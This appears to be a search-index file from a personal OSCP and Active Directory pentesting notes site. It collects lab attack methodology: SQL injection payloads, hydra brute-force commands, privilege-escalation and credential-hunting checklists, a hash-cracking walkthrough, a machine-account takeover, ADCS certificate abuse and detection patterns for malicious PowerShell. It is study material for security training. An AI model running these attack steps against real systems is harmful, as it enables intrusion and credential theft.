var relearn_searchindex = [
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Web applications methodology(don‚Äôt take brute force lightly) Goggle google google if u don‚Äôt understand¬†use hacktricks for unknow stuff check what web app is running using what web and curl curl -IL http://cube.com/ whatweb http://cube.com/ check exploit for the version of the web app running - searchsploit and exploit db and github searchsploit apache searchsploit nginx if you find a domain name just write it to the sudo nano /etc/hosts If nothing till now Fuzz the VHOSTS using ffuf cube111@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' Directory busting using ffuf¬†try with small.txt and big.txt¬†check every hit ffuf -w directory-list-2.3-small.txt -u http://192.168.120.108/FUZZ ffuf -w directory-list-2.3-big.txt -u http://192.168.120.108/FUZZ file busting using ffuf check with small.txt and big.txt check every hit ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ ffuf -w raft-small-files.txt -u http://192.168.120.108/FUZZ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u ffuf -w raft-big-files.txt -u http://192.168.120.108/FUZZ test for functionality click every button on the pages¬†Hover and check where the url goes check source code¬†HTML comments \u003c!-- This is an HTML comment --\u003e if u find a login page check cms exploit and try default creds-searchsploit and exploit db and github or reuse credentials if you already have SQL Injection¬†try the following payloads for error Payload ' \" # ; ) ' OR 1=1-- \" OR 1=1-- ' OR 'a'='a admin'-- ' OR SLEEP(5)-- Login Bruteforce use hydra or burp suite pitch fork attack cewl http://192.168.190.79/joomla/administrator/ -d 4 -m 5 -w $PWD/cewl2.txt hydra -l admin -P passwords.txt www.example.com http-post-form \"/login:user=^USER^\u0026pass=^PASS^:S=302\" hydra -l elly -e nsr ftp://192.168.237.148 ?path=/var/www¬†if you find parameterrs try sql injection/LFI/RFI remeber LFI sometimes can list directories dont forget to watch out for the source code because sometimes html doesnt render and the output doesnt get shown on the page If you find a page which is listing files or some kind of system stuff happening try OS command injection do parameter fuzzing LFI ‚Äî\u003e try reading config files and ssh keys RFI log poisoning phpwrappers read source code¬†or RCE sql injection (Union based) apart from the url parameters also try stuff on http body parameters That‚Äôs one time I have done a DC-9 box on proving grounds in which there were like doing parameter fuzzing consider this don‚Äôt leave this EMPTY FILE? Check¬†for file uploads and other stuff in the main notes curl -X POST -F \"file=@/home/sinner/Documents/oscp/test.txt\" -F filename=\"/tmp/test.txt\" http://192.168.185.249:33414/file-upload ik u will upload backend specific file but sometimes u have to upload .htaccess file to treat image files as the php files watch out for ODT files embed macros inside and upload for windows check other ports after uploading there might be¬†a¬†link or u might be able to upload¬†from other¬†port After logging in check for any user credentials exploits database creds any templates to overwrite with our code if¬†web application allows some king of os command injection or crons look out for backups ,extensions,plugins and serach for exploits sql injection Linux privilege escalation keep reusing the credentials from other sources to switch user and also try same username and password\nsituational awareness\nsudo -l\nid speacial groups lxd/docker other\nStart with credential hunting try to check config files and xml files and ssh keys and passwords grep -r ‚Äúpassword‚Äù /\nLook for .bak, .swp, .old files that reveal creds\ncheck writable dirs\nfind / -writable -type d 2\u003e/dev/null\nPATH Hijacking / Script Injection\nsearch /home¬†and /var/tmp¬†and /tmp and /opt and¬†/dev/shm¬†and¬†/etc check owner and group ls -al and /etc/passwd open it and bash_history file\nsuid guid\ncapabilities\nlinpeas\ncron jobs using pspsy\nsearch for local listening ports on the loopback interface ss -lnt\ncheck¬†mysql database if 3306 is listening on 127.0.0.1\ncheck what proscesses are running using ps auxw check carefully\ncheck the version of the software for any exploit LPE\nCheck for linux mail server files\nLD_PRELOAD Privilege Escalation\nkernel exploits\nlsblk searching for any unmounted drives\nWindows privilege escalation situational awareness group membership net user cube privileges whoami /priv credential hunting¬†‚Äì check root and check every directory findstr /SIM /C:\"pass\" *.ini *.cfg *.config *.xml check the program Files and program Files x86 directories¬†to know what non default software is installed and check for exploit or nay vulnerability for privilege escalation PS read line powershell history TASKLIST¬†check running proscesses Unquoted Service Path check for service binary hijacking with sharpup is something running locally netstat -ano|findstr LISTENING¬†if yes pivot to the attack box kali and scan and attack winpeas (check out for any higlighted stuff and checkout for autologon credentials) Dumping and Analyzing Process using procdump INSTALLATION RIGHTS\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ssh using git\ngit pric esc https://medium.com/@bdsalards/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d\nweb dav rce https://www.linkedin.com/pulse/exploiting-webdav-gainrce-arav-budhiraja/",
    "description": "Web applications methodology(don‚Äôt take brute force lightly) Goggle google google if u don‚Äôt understand¬†use hacktricks for unknow stuff check what web app is running using what web and curl curl -IL http://cube.com/ whatweb http://cube.com/ check exploit for the version of the web app running - searchsploit and exploit db and github searchsploit apache searchsploit nginx if you find a domain name just write it to the sudo nano /etc/hosts If nothing till now Fuzz the VHOSTS using ffuf cube111@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.",
    "tags": [],
    "title": "main methodology",
    "uri": "/oscp-notes/main-methodology/index.html"
  },
  {
    "breadcrumb": "DrakonOps",
    "content": "Welcome to my OSCP notes!\nUse the sidebar to browse different topics.",
    "description": "Welcome to my OSCP notes!\nUse the sidebar to browse different topics.",
    "tags": [],
    "title": "OSCP Notes",
    "uri": "/oscp-notes/index.html"
  },
  {
    "breadcrumb": "DrakonOps",
    "content": "AD has the largest attack surface and tons of misconfigurations!\nUse the sidebar to browse different topics.",
    "description": "AD has the largest attack surface and tons of misconfigurations!\nUse the sidebar to browse different topics.",
    "tags": [],
    "title": "AD Pentesting",
    "uri": "/ad-pentesting/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "¬†Manual code inspection\nDirectory Fuzzy\nFile fuzzy including extension fuzzing\nbirtua host fuzzing\napache version?\nVersion checking using such split and Google\nlogin with default creds\nParameters which will open the gates for local file inclusions or remote file inclusions\nTrying sequel characters to get an error on the login pages\nIf its api try os command injection\nBrute force the web application if there is no hint of users use cedwl to create a user name word list and try it with rock cube\nIf you get the domain try fuzzing virtual hosts\nlook out for backups\ncracking passwords\nWe don‚Äôt receive a clear answer but it looks like it‚Äôs probably some hashing combination involving MD5. We can use the tool mdxfind to help us determine how these password hashes were created. We can download a binary from here.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ wget https://www.techsolvency.com/pub/bin/mdxfind/mdxfind.static -O mdxfind ‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ chmod +x mdxfind Before we can run mdxfind, we will need to figure out the salt value used by Monstra CMS and we will need a hash that we know what the original password was. After some web searching, we find this blog which claims that the salt can very likely be the default value of ‚ÄúYOUR_SALT_HERE‚Äù. Let‚Äôs write this to a file for use later.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ echo \"YOUR_SALT_HERE\" \u003e salt.txt As for the known hash, we can simply use the hash of the admin user because we know the password is ‚Äúwazkowski‚Äù. Let‚Äôs create a password file with only that password for mdxfind to use.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ echo \"wazkowski\" \u003e pass.txt We now need to pass the admin password hash into mdxfind using stdin and specify MD5 hashing, our salt and pass files, and we can attempt to try 5 iterations.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ echo \"a2b4e80cd640aaa6e417febe095dcbfc\" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5 1 salts read from salt.txt Iterations set to 5 ... 1 total salts in use Generated 19998 Userids Reading hash list from stdin... Took 0.00 seconds to read hashes Searching through 1 unique hashes from \u003cSTDIN\u003e Maximum hash chain depth is 1 Minimum hash length is 32 characters Using 4 cores MD5PASSSALTx02 a2b4e80cd640aaa6e417febe095dcbfc:YOUR_SALT_HERE:wazowski Done - 4 threads caught 1 lines processed in 0 seconds 1.00 lines per second 0.10 seconds hashing, 2,027,998 total hash calculations 20.33M hashes per second (approx) 1 total files 1 MD5PASSSALTx02 hashes found 1 Total hashes found The command completes quickly and we now know that these hashes are created with 2 rounds of MD5 with our assumed salt value of ‚ÄúYOUR_SALT_HERE‚Äù. With this information, we can now use mdxfind again to attempt to crack the password hash for the ‚Äúmike‚Äù user. Let‚Äôs run the same command but swap in mike‚Äôs hash, specify the hash type, supply the rockyou wordlist, and switch it to 2 iterations.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ echo \"844ffc2c7150b93c4133a6ff2e1a2dba\" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/sharewordlists/rockyou.txt -i 2 1 salts read from salt.txt Iterations set to 2 Working on hash types: MD5PASSSALT SHA1revMD5PASSSALT SHA1MD5PASSSALT MD5-SALTMD5PASSSALT 1 total salts in use Reading hash list from stdin... Took 0.00 seconds to read hashes Searching through 1 unique hashes from \u003cSTDIN\u003e Maximum hash chain depth is 1 Minimum hash length is 32 characters Using 4 cores MD5PASSSALTx02 844ffc2c7150b93c4133a6ff2e1a2dba:YOUR_SALT_HERE:Mike14 Done - 4 threads caught 14,344,392 lines processed in 6 seconds 2390732.00 lines per second 5.83 seconds hashing, 143,443,920 total hash calculations 24.59M hashes per second (approx) 1 total files 1 MD5PASSSALTx02 hashes found 1 Total hashes found We have cracked mike‚Äôs password. Maybe Mike uses the same password for RDP. Let‚Äôs give it a shot.\n‚îå‚îÄ‚îÄ(‚ñà‚ñà‚ñà„âø‚ñà‚ñà‚ñà)-[~] ‚îî‚îÄ$ xfreerdp /cert-ignore /u:mike /p:Mike14 /v:192.168.120.156",
    "description": "Manual code inspection\nDirectory Fuzzy\nFile fuzzy including extension fuzzing\nbirtua host fuzzing\napache version?\nVersion checking using such split and Google\nlogin with default creds\nParameters which will open the gates for local file inclusions or remote file inclusions\nTrying sequel characters to get an error on the login pages\nIf its api try os command injection\nBrute force the web application if there is no hint of users use cedwl to create a user name word list and try it with rock cube",
    "tags": [],
    "title": "methodology",
    "uri": "/oscp-notes/methodology/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†AD Pentesting",
    "content": "Abusing Pre 2k Enumeration When a new computer is added to the AD with Pre2k it has the same password as the username in lower case excluding $ We can reset the password and take over that machine account ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/pre2k/pre2k] ‚îî‚îÄ$ pre2k auth -u cube -p 'Frishta123!' -dc-ip 192.168.10.30 -d yr.local ___ __ /'___`\\ /\\ \\ _____ _ __ __ /\\_\\ /\\ \\\\ \\ \\/'\\ /\\ '__`\\/\\`'__\\/'__`\\ _______\\/_/// /__\\ \\ , \u003c \\ \\ \\L\\ \\ \\ \\//\\ __//\\______\\ // /_\\ \\\\ \\ \\\\`\\ \\ \\ ,__/\\ \\_\\\\ \\____\\/______/ /\\______/ \\ \\_\\ \\_\\ \\ \\ \\/ \\/_/ \\/____/ \\/_____/ \\/_/\\/_/ \\ \\_\\ v3.1 \\/_/ @unsigned_sh0rt @Tw1sm [14:10:17] INFO Retrieved 2 results total. [14:10:17] INFO Testing started at 2025-11-04 14:10:17 [14:10:17] INFO Using 10 threads [14:10:17] INFO VALID CREDENTIALS: migrate.offsec\\LAD$:lad You can also use nxc to test this¬†We can change the password using impacket tools (don‚Äôt forget to escape the $ ) ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/pre2k/pre2k] ‚îî‚îÄ$ impacket-changepasswd yr.local/LAD\\$@192.168.10.30 -newpass 'WinDsorLocks345!' -p rpc-samr Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Current password: [*] Changing the password of offsec\\LAD$ [*] Connecting to DCE/RPC as offsec\\LAD$ [*] Password was changed successfully. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/pre2k/pre2k] ‚îî‚îÄ$ nxc smb 192.168.10.30 -u LAD$ -p 'WinDsorLocks345!' SMB 192.168.10.30 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:migrate.offsec) (signing:True) (SMBv1:False) SMB 192.168.10.30 445 DC01 [+] yr.local\\LAD$:WinDsorLocks345!",
    "description": "Abusing Pre 2k Enumeration When a new computer is added to the AD with Pre2k it has the same password as the username in lower case excluding $ We can reset the password and take over that machine account ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/pre2k/pre2k] ‚îî‚îÄ$ pre2k auth -u cube -p 'Frishta123!' -dc-ip 192.168.10.30 -d yr.local ___ __ /'___`\\ /\\ \\ _____ _ __ __ /\\_\\ /\\ \\\\ \\ \\/'\\ /\\ '__`\\/\\`'__\\/'__`\\ _______\\/_/// /__\\ \\ , \u003c \\ \\ \\L\\ \\ \\ \\//\\ __//\\______\\ // /_\\ \\\\ \\ \\\\`\\ \\ \\ ,__/\\ \\_\\\\ \\____\\/______/ /\\______/ \\ \\_\\ \\_\\ \\ \\ \\/ \\/_/ \\/____/ \\/_____/ \\/_/\\/_/ \\ \\_\\ v3.",
    "tags": [],
    "title": "Windows Pre 2000 Abuse",
    "uri": "/ad-pentesting/windows-pre-2000-abuse/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†AD Pentesting",
    "content": "Setting up ADCS and PKINT First install the ADCS (active directory certificate services) Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools Install The enterprise ROOT CA Install-AdcsCertificationAuthority ` -CAType EnterpriseRootCA ` -CACommonName \"MIGRATE-RootCA\" ` -KeyLength 2048 ` -HashAlgorithmName SHA256 ` -CryptoProviderName \"RSA#Microsoft Software Key Storage Provider\" ` -ValidityPeriod Years ` -ValidityPeriodUnits 10 ` -Force Using the GUI (MMC Certificate Templates Grant user Enroll rights) Open the Certificate Templates Console:\nRun certtmpl.msc from Start or the Run dialog. Find the ‚ÄúUser‚Äù template in the list.\nRight-click the ‚ÄúUser‚Äù template and select Properties.\nGo to the Security tab.\nClick Add, enter svc-jenkins, and add it to the ACL.\nGrant Read and Enroll permissions to svc-jenkins.\nClick Apply and OK.\nWe added svc-jenkins to the enroll Now to request the certificate signing¬†for the¬†user svc-jenkins make a .inf file¬†(make sure to change with your CA and Subject ,upn) PS C:\\Users\\svc-jenkins\\Documents\u003e cat .\\jenkins.inf [Version] Signature=\"$Windows NT$\" [NewRequest] Subject = \"CN=svc-jenkins\" Exportable = TRUE KeyLength = 2048 KeySpec = 1 KeyUsage = 0xa0 MachineKeySet = FALSE SMIME = FALSE PrivateKeyArchive = FALSE UserProtected = FALSE UseExistingKeySet = FALSE ProviderName = \"Microsoft RSA SChannel Cryptographic Provider\" ProviderType = 12 RequestType = PKCS10 [Extensions] ; Critical: Add UPN in SAN for PKINIT 2.5.29.17 = \"{text}\" _continue_ = \"upn=svc-jenkins@migrate.offsec\" [RequestAttributes] CertificateTemplate = User PS C:\\Users\\svc-jenkins\\Documents\u003e Now generate a request¬†PS C:\\Users\\svc-jenkins\\Documents\u003e certreq -new jenkins.inf jenkins.req Active Directory Enrollment Policy {B5DB9E47-A1AB-4BD2-9BBE-5B0DB10B221B} ldap: CertReq: Request Created Submit the request PS C:\\Users\\svc-jenkins\\Documents\u003e certreq -submit jenkins.req Active Directory Enrollment Policy {B5DB9E47-A1AB-4BD2-9BBE-5B0DB10B221B} ldap: RequestId: 4 RequestId: \"4\" Certificate retrieved(Issued) Issued 0x80094004, The Enrollee (CN=svc-jenkins,CN=Users,DC=migrate,DC=offsec) has no E-Mail name registered in the Active Directory. The E-Mail name will not be included in the certificate. Accept the Certificate PS C:\\Users\\svc-jenkins\\Documents\u003e certreq -accept jenkins.cer Installed Certificate: Serial Number: 4d00000004c6e86930128b88dc000000000004 Subject: CN=svc-jenkins, CN=Users, DC=migrate, DC=offsec (Other Name:Principal Name=svc-jenkins@migrate.offsec) NotBefore: 11/5/2025 4:35 PM NotAfter: 11/5/2026 4:35 PM Thumbprint: 5d93e78e46e86f22777b398e40c4e04ac2f3c17e Export the .pfx file (replace the ‚Äòyourstrongpassword‚Äô)‚Äô $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object { $_.Subject -like \"*svc-jenkins*\" } $mypwd = ConvertTo-SecureString -String 'YourStrongPasswordHere' -Force -AsPlainText Export-PfxCertificate -Cert $cert -FilePath \"C:\\Users\\svc-jenkins\\Documents\\svc-jenkins.pfx\" -Password $mypwd now you can use the .pfx for the authentication¬†using PKINIT tools to get TGT ‚îå‚îÄ‚îÄ(venv)‚îÄ(kali„âøkali)-[~/pywhisker/pywhisker/PKINITtools] ‚îî‚îÄ$ python3 gettgtpkinit.py -cert-pfx \"/home/kali/pre2k/pre2k/svc-jenkins.pfx\" -pfx-pass \"YourStrongPasswordHere\" \"cube.local/svc-jenkins\" \"TGT_CCACHE_FILE\" 2025-11-05 20:07:09,926 minikerberos INFO Loading certificate and key from file 2025-11-05 20:07:09,949 minikerberos INFO Requesting TGT 2025-11-05 20:07:09,983 minikerberos INFO AS-REP encryption key (you might need this later): 2025-11-05 20:07:09,983 minikerberos INFO d218ff618769ee8c5d0d204b9c2085be2e9854008d93c252ca015f4cdb2868d5 2025-11-05 20:07:09,994 minikerberos INFO Saved TGT to file",
    "description": "Setting up ADCS and PKINT First install the ADCS (active directory certificate services) Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools Install The enterprise ROOT CA Install-AdcsCertificationAuthority ` -CAType EnterpriseRootCA ` -CACommonName \"MIGRATE-RootCA\" ` -KeyLength 2048 ` -HashAlgorithmName SHA256 ` -CryptoProviderName \"RSA#Microsoft Software Key Storage Provider\" ` -ValidityPeriod Years ` -ValidityPeriodUnits 10 ` -Force Using the GUI (MMC Certificate Templates Grant user Enroll rights) Open the Certificate Templates Console:\nRun certtmpl.msc from Start or the Run dialog.",
    "tags": [],
    "title": "ADCS",
    "uri": "/ad-pentesting/setting-up-adcs-and-pkint/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Perfect ‚Äî you‚Äôve shared logs from a PowerShell-based attack simulation, likely involving encoded command execution, web client downloads, and obfuscated scripts ‚Äî classic indicators of malicious PowerShell activity (e.g., Cobalt Strike, Empire, or custom malware).\nSince you‚Äôve already loaded the data and confirmed the structure, let‚Äôs refine the feature engineering and Isolation Forest training specifically for this dataset.\nimport pandas as pd import json # Load and normalize data = [] with open(\"dcsync.json\", \"r\") as f: for line in f: try: data.append(json.loads(line)) except: continue df = pd.json_normalize(data) print(f\"‚úÖ Loaded {len(df)} events.\") Qwen3-Max-Preview7:00 pm\nPerfect ‚Äî you‚Äôve shared logs from a PowerShell-based attack simulation, likely involving encoded command execution, web client downloads, and obfuscated scripts ‚Äî classic indicators of malicious PowerShell activity (e.g., Cobalt Strike, Empire, or custom malware).\nSince you‚Äôve already loaded the data and confirmed the structure, let‚Äôs refine the feature engineering and Isolation Forest training specifically for this dataset.\n‚úÖ STEP 1: Normalize \u0026 Load the Data (Again, for Clarity) import pandas as pd import json # Load and normalize data = [] with open(\"dcsync.json\", \"r\") as f: for line in f: try: data.append(json.loads(line)) except: continue df = pd.json_normalize(data) print(f\"‚úÖ Loaded {len(df)} events.\") ‚úÖ STEP 2: Focus on High-Risk Channels Your logs show events from:\nWindows PowerShell Microsoft-Windows-PowerShell/Operational Microsoft-Windows-Sysmon/Operational security high_risk_channels = [ 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-Sysmon/Operational' ] df = df[df['Channel'].isin(high_risk_channels)].copy() print(f\"‚úÖ Filtered to {len(df)} high-risk events.\") STEP 3: Feature Engineering ‚Äî Tailored for PowerShell Attacks We‚Äôll extract features that flag suspicious PowerShell behavior:\nüéØ Key Features to Create: import numpy as np from sklearn.preprocessing import LabelEncoder # Convert timestamp df['@timestamp'] = pd.to_datetime(df['@timestamp'], errors='coerce') df['Hour'] = df['@timestamp'].dt.hour df['DayOfWeek'] = df['@timestamp'].dt.dayofweek # Encode categorical features categorical_features = ['EventID', 'Channel', 'AccountName', 'Hostname'] for col in categorical_features: if col in df.columns: le = LabelEncoder() df[col + '_Encoded'] = le.fit_transform(df[col].astype(str).fillna('Unknown')) # Feature: CommandLine length def get_command_text(row): # Try Payload first, then Message, then ContextInfo for col in ['Payload', 'Message', 'ContextInfo']: if col in row and isinstance(row[col], str): return row[col] return \"\" df['CommandText'] = df.apply(get_command_text, axis=1) df['CommandLineLength'] = df['CommandText'].str.len().fillna(0) # Feature: Base64 detection def has_base64(text): if not isinstance(text, str): return 0 # Look for PowerShell base64 flags or long base64-like strings if any(flag in text for flag in ['-enc ', '-e ', ' -enc', ' -e']): return 1 # Heuristic: long string with no spaces and A-Za-z0-9+/= chars if len(text) \u003e 200 and ' ' not in text[:100] and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in text[:200]): return 1 return 0 df['HasBase64'] = df['CommandText'].apply(has_base64) # Feature: WebClient detection def has_webclient(text): if not isinstance(text, str): return 0 patterns = [ 'System.Net.WebClient', 'DownloadString', 'DownloadData', 'DownloadFile', 'Net.WebClient', 'new-object net.webclient' ] return int(any(p.lower() in text.lower() for p in patterns)) df['HasWebClient'] = df['CommandText'].apply(has_webclient) # Feature: RC4 detection (common in implants) def has_rc4(text): if not isinstance(text, str): return 0 patterns = [ 'RC4', '$S[$_], $S[$J] = $S[$J], $S[$_]', '256 | ForEach-Object', 'XOR $S', 'Key Scheduling Algorithm' ] return int(any(p.lower() in text.lower() for p in patterns)) df['HasRC4'] = df['CommandText'].apply(has_rc4) # Feature: User event frequency if 'AccountName' in df.columns: user_freq = df['AccountName'].value_counts() df['UserEventCount'] = df['AccountName'].map(user_freq).fillna(0) # Label for evaluation (NOT used in training) SUSPICIOUS_PATTERNS = [ 'System.Net.WebClient', 'DownloadString', 'RC4', '-enc ', 'Get-Random', 'ForEach-Object', 'New-Object', 'Out-Null' # Often abused to hide output ] df['IsSuspiciousEvent'] = df['CommandText'].apply( lambda x: 1 if isinstance(x, str) and any(p.lower() in x.lower() for p in SUSPICIOUS_PATTERNS) else 0 ) print(\"‚úÖ Feature engineering complete!\") ‚úÖ STEP 4: Prepare Feature Matrix feature_columns = [ 'EventID_Encoded', 'Channel_Encoded', 'AccountName_Encoded', 'Hostname_Encoded', 'Hour', 'DayOfWeek', 'CommandLineLength', 'HasBase64', 'HasWebClient', 'HasRC4', 'UserEventCount' ] # Only keep columns that exist and are numeric feature_columns = [col for col in feature_columns if col in df.columns] X = df[feature_columns].fillna(0) # Fill NaN with 0 print(\"‚úÖ Selected features:\", feature_columns) print(\"‚úÖ Feature matrix shape:\", X.shape) ‚úÖ STEP 5: Train Isolation Forest python from sklearn.ensemble import IsolationForest iso_forest = IsolationForest( n_estimators=100, contamination=0.05, # Assume 5% anomalies random_state=42, n_jobs=-1 ) iso_forest.fit(X) df['Anomaly'] = iso_forest.predict(X) # -1 = anomaly, 1 = normal df['AnomalyScore'] = iso_forest.decision_function(X) # Lower = more anomalous print(\"‚úÖ Model trained!\") print(\"Anomaly distribution:\") print(df['Anomaly'].value_counts()) ‚úÖ STEP 6: Evaluate Performance python # Calculate Recall and FPR using IsSuspiciousEvent as ground truth suspicious = df[df['IsSuspiciousEvent'] == 1] anomalous_suspicious = suspicious[suspicious['Anomaly'] == -1] print(f\"Total Suspicious Events: {len(suspicious)}\") print(f\"Detected as Anomaly: {len(anomalous_suspicious)}\") if len(suspicious) \u003e 0: recall = len(anomalous_suspicious) / len(suspicious) print(f\"üéØ Recall: {recall:.2%}\") non_suspicious = df[df['IsSuspiciousEvent'] == 0] fp = non_suspicious[non_suspicious['Anomaly'] == -1] fpr = len(fp) / len(non_suspicious) if len(non_suspicious) \u003e 0 else 0 print(f\"üéØ False Positive Rate: {fpr:.2%}\") üéØ Your goal: Recall ‚â•85%, FPR \u003c5% ‚úÖ STEP 7: Visualize \u0026 Interpret Results python import matplotlib.pyplot as plt import seaborn as sns # Plot anomaly scores plt.figure(figsize=(12, 5)) plt.subplot(1, 2, 1) sns.histplot(data=df, x='AnomalyScore', hue='IsSuspiciousEvent', kde=True) plt.title('Anomaly Score: Suspicious vs Normal Events') plt.subplot(1, 2, 2) top_anomalies = df.nsmallest(10, 'AnomalyScore') sns.barplot(data=top_anomalies, y='EventID', x='AnomalyScore', orient='h') plt.title('Top 10 Most Anomalous Events by EventID') plt.tight_layout() plt.show() # Show top 5 most anomalous events print(\"\\nüîç Top 5 Most Anomalous Events:\") display_cols = ['@timestamp', 'EventID', 'Channel', 'AccountName', 'AnomalyScore', 'HasBase64', 'HasWebClient', 'HasRC4'] print(df.nsmallest(5, 'AnomalyScore')[display_cols].to_string()) ‚úÖ STEP 8: Hyperparameter Tuning (Your Responsibility üòä) python from sklearn.model_selection import ParameterGrid param_grid = { 'contamination': [0.01, 0.03, 0.05, 0.1], 'n_estimators': [50, 100, 200] } best_recall = 0 best_params = None for params in ParameterGrid(param_grid): model = IsolationForest(**params, random_state=42, n_jobs=-1) model.fit(X) preds = model.predict(X) df['Anomaly'] = preds suspicious = df[df['IsSuspiciousEvent'] == 1] detected = suspicious[suspicious['Anomaly'] == -1] recall = len(detected) / len(suspicious) if len(suspicious) \u003e 0 else 0 if recall \u003e best_recall: best_recall = recall best_params = params print(\"‚úÖ Best Parameters:\", best_params)",
    "description": "Perfect ‚Äî you‚Äôve shared logs from a PowerShell-based attack simulation, likely involving encoded command execution, web client downloads, and obfuscated scripts ‚Äî classic indicators of malicious PowerShell activity (e.g., Cobalt Strike, Empire, or custom malware).\nSince you‚Äôve already loaded the data and confirmed the structure, let‚Äôs refine the feature engineering and Isolation Forest training specifically for this dataset.\nimport pandas as pd import json # Load and normalize data = [] with open(\"dcsync.",
    "tags": [],
    "title": "project",
    "uri": "/oscp-notes/project/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "subdomains\ncurl -s https://crt.sh/json?q=chatgpt.com | jq -r '.[].common_name' | sort -u\ncube111@local[/local]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 \u003e\u003e ip-addresses.txt;done cube111@local[/local]$ for i in $(cat ip-addresses.txt);do shodan host $i;done dig any inlanefreight.com dig @8.8.8.8 any mjcollege.ac.in\\\ndomain.glass\nhttps://buckets.grayhatwarfare.com/\nTool Description Features Wappalyzer Browser extension and online service for website technology profiling. Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. BuiltWith Web technology profiler that provides detailed reports on a website‚Äôs technology stack. Offers both free and paid plans with varying levels of detail. WhatWeb Command-line tool for website fingerprinting. Uses a vast database of signatures to identify various web technologies. Nmap Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. Can be used with scripts (NSE) to perform more specialised fingerprinting. Netcraft Offers a range of web security services, including website fingerprinting and security reporting. Provides detailed reports on a website‚Äôs technology, hosting provider, and security posture. wafw00f Command-line tool specifically designed for identifying Web Application Firewalls (WAFs). Helps determine if a WAF is present and, if so, its type and configuration. Header\ncube111@local[/local]$ curl -I https://www.inlanefreight.com HTTP/1.1 200 OK Date: Fri, 31 May 2024 12:12:26 GMT Server: Apache/2.4.41 (Ubuntu) Link: \u003chttps://www.inlanefreight.com/index.php/wp-json/\u003e; rel=\"https://api.w.org/\" Link: \u003chttps://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7\u003e; rel=\"alternate\"; type=\"application/json\" Link: \u003chttps://www.inlanefreight.com/\u003e; rel=shortlink Content-Type: text/html; charset=UTF-8 *****VHOSTS\nWeb Application Firewalls (WAFs)\ncube111@local[/local]$ pip3 install git+https://github.com/EnableSecurity/wafw00f cube111@local[/local]$ wafw00f inlanefreight.com ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\" _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.2.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://inlanefreight.com [+] The site https://inlanefreight.com is behind Wordfence (Defiant) WAF. [~] Number of requests: 2 NIKTO\ncube111@local[/local]$ sudo apt update \u0026\u0026 sudo apt install -y perl cube111@local[/local]$ git clone https://github.com/sullo/nikto cube111@local[/local]$ cd nikto/program cube111@local[/local]$ chmod +x ./nikto.pl nikto -h inlanefreight.com -Tuning b check for robots.txt crwlers\ncheck for .well-known end point\ngobuster dir -u https://example.com/.well-known/ -w /usr/share/seclists/Discovery/Web-Content/common.txt\nWeb crawling\ncube111@local[/local]$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip cube111@local[/local]$ unzip ReconSpider.zip cube111@local[/local]$ python3 ReconSpider.py http://inlanefreight.com nano results.json\nGOOGLE DORKS\nOperator Operator Description Example Example Description site: Limits results to a specific website or domain. site:example.com Find all publicly accessible pages on example.com. inurl: Finds pages with a specific term in the URL. inurl:login Search for login pages on any website. filetype: Searches for files of a particular type. filetype:pdf Find downloadable PDF 